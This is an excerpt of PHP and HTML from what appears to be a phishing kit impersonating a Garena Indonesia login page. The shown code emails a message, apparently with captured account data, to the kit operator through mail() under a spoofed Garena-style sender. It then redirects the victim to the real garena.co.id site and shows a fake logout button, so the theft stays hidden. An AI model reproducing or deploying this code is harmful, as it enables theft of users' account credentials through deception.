...
$headers = "From: 𝕻𝖚𝖑𝖇𝖊𝖗𝕬𝖏𝖆 ᴀᴋᴜɴ ɢᴀʀᴇɴᴀ <Pulberaja.garena>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));
?>
'<script>window.location.replace("https://www.garena.co.id/")</script>';}
}
?>
<!-- ADHAN TAMVAN  !! -->
...
<div style="width:100%" class="form-group">
  ...
  <a  href="https://www.garena.co.id/" class="btn btn-block" style="color: #F8F8FF;background-color: #000000;" id="gsubmit"> LOGOUT </a>			
